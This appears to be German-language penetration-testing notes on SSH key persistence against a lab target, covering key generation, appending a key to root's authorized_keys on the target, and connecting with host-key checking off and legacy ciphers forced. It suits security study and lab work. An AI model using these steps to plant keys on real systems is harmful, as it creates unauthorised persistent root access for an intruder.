# SSH Key Persistence & Access

## 1. SSH Key Generierung (Angreifer-Maschine)

```bash
# Ed25519 (modern, empfohlen)
ssh-keygen -t ed25519 -f ~/.ssh/target -N ""

# RSA (kompatibel mit alten Systemen)
ssh-keygen -t rsa -b 4096 -f ~/.ssh/target -N ""

# Public Key anzeigen
cat ~/.ssh/target.pub
```

## 2. Public Key auf Ziel-System hinzufügen

### Variante A: Mit Schreibzugriff auf authorized_keys
```bash
# .ssh Verzeichnis erstellen falls nicht vorhanden
mkdir -p /root/.ssh

# Public Key hinzufügen
echo 'ssh-ed25519 AAAAC3NzaA1lZDI1NTE5AAAAIDrbzDtOsGbnUCmD26RY3S8ZfSYiAjOr08Pt22ftKiT0' >> /root/.ssh/authorized_keys

# Korrekte Berechtigungen setzen (WICHTIG!)
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
chown -R root:root /root/.ssh

# Für andere User
echo 'ssh-ed25519 AAAAC3Nza...' >> /home/user/.ssh/authorized_keys
chmod 700 /home/user/.ssh
chmod 600 /home/user/.ssh/authorized_keys
chown -R user:user /home/user/.ssh
```

### Variante B: Mit echo + tee (falls sudo benötigt)
```bash
echo 'ssh-ed25519 AAAAC3Nza...' | tee -a /root/.ssh/authorized_keys
```

### Variante C: Via sed/printf (Reverse Shell ohne echo)
```bash
printf 'ssh-ed25519 AAAAC3Nza...\n' >> /root/.ssh/authorized_keys
```

## 3. SSH Verbindung aufbauen

### Standard-Verbindung
```bash
# Mit Private Key
ssh -i ~/.ssh/target root@192.168.153.150

# Mit User
ssh -i ~/.ssh/target user@192.168.153.150
```

### Bei Algorithmus-Problemen (alte SSH-Versionen)
```bash
# Verbose Output für Debugging
ssh -vvv -i ~/.ssh/target root@192.168.153.150

# Alternative Key Exchange Algorithmen
ssh -i ~/.ssh/target -o KexAlgorithms=diffie-hellman-group14-sha256 -o Ciphers=aes128-ctr root@192.168.153.150

# Legacy-Algorithmen erzwingen
ssh -o KexAlgorithms=diffie-hellman-group1-sha1 -o Ciphers=aes128-cbc user@192.168.153.150
```

## 4. Troubleshooting

### Berechtigungsprobleme
```bash
# SSH wird fehlschlagen wenn Berechtigungen falsch sind:
# - .ssh muss 700 sein (drwx------)
# - authorized_keys muss 600 sein (-rw-------)
# - Besitzer muss der User sein

ls -la /root/.ssh/
```

### SSH Service Status prüfen
```bash
systemctl status ssh
systemctl status sshd

# SSH Service starten falls gestoppt
systemctl start ssh
```

### StrictHostKeyChecking deaktivieren
```bash
ssh -i ~/.ssh/target -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@192.168.153.150
```

## 5. Beispiele

```bash
# Beispiel 1: Vollständiger Workflow
ssh-keygen -t ed25519 -f ~/.ssh/ms01 -N ""
cat ~/.ssh/ms01.pub  # Kopieren
# Auf Ziel: echo 'PUBKEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
ssh -i ~/.ssh/ms01 usr@ms01

# Beispiel 2: Mit alternativen Algorithmen
ssh -o KexAlgorithms=diffie-hellman-group14-sha256 -o Ciphers=aes128-ctr usr@ms01

```